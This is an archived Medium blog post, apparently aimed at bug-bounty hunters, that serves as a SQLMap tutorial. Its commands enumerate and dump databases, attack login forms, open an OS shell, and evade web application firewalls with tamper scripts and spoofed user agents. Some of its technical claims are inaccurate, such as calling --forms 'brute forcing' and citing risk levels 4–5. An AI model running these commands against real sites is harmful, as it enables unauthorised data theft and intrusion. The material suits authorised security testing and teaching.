# The Hidden SQL Injection Techniques That Google Doesn’t Want You To Know

- **Source URL:** https://medium.com/@qaafqasim/the-hidden-sql-injection-techniques-that-google-doesnt-want-you-to-know-e366a0d8f444?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250404120318/https://medium.com/@qaafqasim/the-hidden-sql-injection-techniques-that-google-doesnt-want-you-to-know-e366a0d8f444
- **Fetched:** 2026-11-22
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/3813 (id 3813)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# The Hidden SQL Injection Techniques That Google Doesn’t Want You To Know 💻😱😈

## Conquer Web Apps with SQLMap — The Ultimate User Guide

**Github Repo:** [https://github.com/sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)

**Installation command :**

*git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev*

# Getting Started with SQLMAP

SQLMAP offers various parameters and options to customize your testing approach. Let’s dive into some of the essential commands and techniques.

## Crawling the Website

🕷️ Crawling is the process of traversing a website to collect information. SQLMAP allows you to crawl a website with different depths.

*To crawl a site with a depth of 2 we change these 3 and 4 as our requirement :*

`sqlmap -u <web_link> --crawl 2`
## Streamlining with Batch Mode

⏱️ Batch mode can save you time by automating responses.

`sqlmap -u <web_link> --crawl 2 --batch`
# Multithreading for Efficiency

🚀 Boost your efficiency by using multiple threads. Using this command we control the thread the thread's number depends on our internet speed CPU and GPU speed and server response.

Always start with **1 thread** and gradually increase the number. Monitor for errors or crashes.

Using up to **10 threads** is generally okay for small to medium sites. But go higher with caution.

For high-profile sites, very large databases, or critical infrastructure, stick to **minimal threads like 1–3**

Using too many **threads (50+)** can overwhelm the target and get your IP blocked or flagged as a DoS attack


`sqlmap -u <web_link> --crawl 2 --batch --threads <num_threads>`
## Managing Risk Levels

🌐 Adjust risk levels to control the use of harmful payloads.

**Risk level 1** is good for initial testing, **Risk 2–3** is moderately aggressive, and Only use level **4–5 risk payloads** against local test systems. For critical infrastructure, stick to **risk 1 or 2** during assessments and If using **risk 3–5,** monitor closely for application or server errors, hangs, crashes, etc


`sqlmap -u <web_link> --crawl 2 --batch --risk 1`
## Selecting SQL Injection Techniques

🔍 SQLMAP supports various techniques, such as the union technique. This command is used for the union technique.

`sqlmap -u <web_link> --crawl 2 --technique="U"`
## Verbose Mode for Detailed Output

📝 In verbose mode, SQLMAP provides detailed output, including payload and HTTPS request error messages.

`sqlmap -u <web_link> --crawl 2 --batch -v`
## Retrieving Database Information

📊 Gain insights into the database, including database name, username, and hostname.

`sqlmap -u <web_link> --crawl 2 --current-user --current-db --hostname`
## Exploring Database Structures

🗃️ Delve into the database structure to discover tables

*Listing databases:*

`sqlmap -u <web_link> --crawl 2 --dbs`
*Exploring tables in a specific database:*

`sqlmap -u <web_link> --crawl 2 -D <database_name> --tables`
## Extracting Data

📂 Retrieve data from specific tables using the **dump** command Extracting data from a table.

`sqlmap -u <web_link> --crawl 2 -T <table_name> --dump`
## Viewing Table Columns

📊 Identify columns within a table.

`sqlmap -u <web_link> --crawl 2 -T <table_name> --columns`
## Dumping All Data

📦 Using the dump all command we can dump all data from a table.

`sqlmap -u <web_link> --crawl 2 -T <table_name> --dump-all`
## Custom Output Directory

📁 Using the **output dir** command we can save the output in specified directory data to a specific directory.

`sqlmap -u <web_link> --crawl 2 --output-dir="<directory_path>" --batch`
# *Advance SQLMAP Command :*

## Manipulating Headers and User Agents

🛡️ Customize headers and user agents for requests.

- Adding custom headers:

**sqlmap -u \<web\_link> --crawl 2 --headers="\<custom\_headers>"**

- Modifying user agents:

**sqlmap -u \<web\_link> --crawl 2 --user-agent="\<user\_agent>"**

- Using a mobile as a user-agent:

**sqlmap -u \<web\_link> --crawl 2 --mobile**

## **Advance tips:**

Using a mobile as user agnet or real browser user agent like Chrome or Firefox makes the requests look more legitimate and less suspicious.

Many firewalls block requests from common SQLMap user agents. Setting a custom user agent can bypass Firewall.


# Bypassing Firewalls

🔒 Using the tamper option we can bypass Bypass firewalls to ensure successful testing. The tamper option encodes the payload using a different encoding technique.

- Using this tamper command we can see all encoding methods:
- **sqlmap --list-tampers**
- like in this command we use the base64encoder Encoding payloads to bypass firewalls:

**sqlmap -u \<web\_link> --crawl 2 --tamper=base64encoder**

## **Advance tips**

*WAFs/Firewalls blocking based on payload keywords:*

Use comment tampers like — comment=N to disrupt keyword blocking rules.

Replace spaces with comments via space2mysqldash or tabs via tabifyspaces.

Use versionedmorekeywords tamper to add version strings to keywords like SELECT/*!00000ver=*/

*WAFs/Firewalls blocking specific characters:*

Encode characters like charencode, charunicodeencode or base64encode.

Use backslashquote or apostrophemask to sneak quotes/apostrophes past filters.

Replace = with LIKE via equalsToLike tamper to bypass = blocking rules.

*Payload size limits:*

Use between tamper to split payloads into random chunks.

Reduce inline comment size with comment-inline tamper.

Replace spaces with small comments like /\*\*/ via space2comment.


# Brute Force Login Pages

🔐 To test for SQL injection in login pages, follow these steps:

**Here are the typical steps to brute force a login page using SQLMap:**

Manually analyze the page to determine the key parameters:

- Identify the username and password fields and note their HTML name attributes.
- Find the form submit button and get its name attribute.
- Check the form’s action attribute to see where it submits to.

```
sqlmap -u "http://example.com/login.php" --forms --crawl=2 --batch --threads=5 
        -p "username=*&password=*&submit=Submit" 
        --level=5 --risk=3 -v 3
```
**Let’s break this down:**

- The -u specifies the target URL
- — forms enables brute forcing of form fields
- — crawl=2 sets the crawl depth to 2 pages
- — batch enables batch mode for automated testing
- — threads=5 sets 5 concurrent threads to speed up testing
- -p “username=*&password=*&submit=Submit” sets the POST body with wildcards for brute forcing
- — level=5 sets level of 5 for aggressive testing
- — risk=3 sets risk to 3 for more dangerous payloads
- -v 3 sets the verbose level to 3 for more detailed output

**🔍 SQLMAP offers advanced options for expert users:**

- Working with cookies:

**sqlmap -u \<web\_link> --crawl 2 --cookies="\<cookie\_data>"**

- Session management:

**sqlmap -u \<web\_link> --crawl 2 --flush-session**

- Uncovering hidden comments:

**sqlmap -u \<web\_link> --crawl 2 --comment**

- Accessing the command shell:

**sqlmap -u \<web\_link> --crawl 2 --os-shell**

## Conclusion

SQL injection testing with **SQLMAP** is a powerful way to secure your web applications. Remember to use this tool responsibly and only on systems you have permission to test. Stay safe, and happy hacking! 🛡️💻

#SQL #Hacking #Cybersecurity #WebSecurity #SQLInjection #SQLMAP
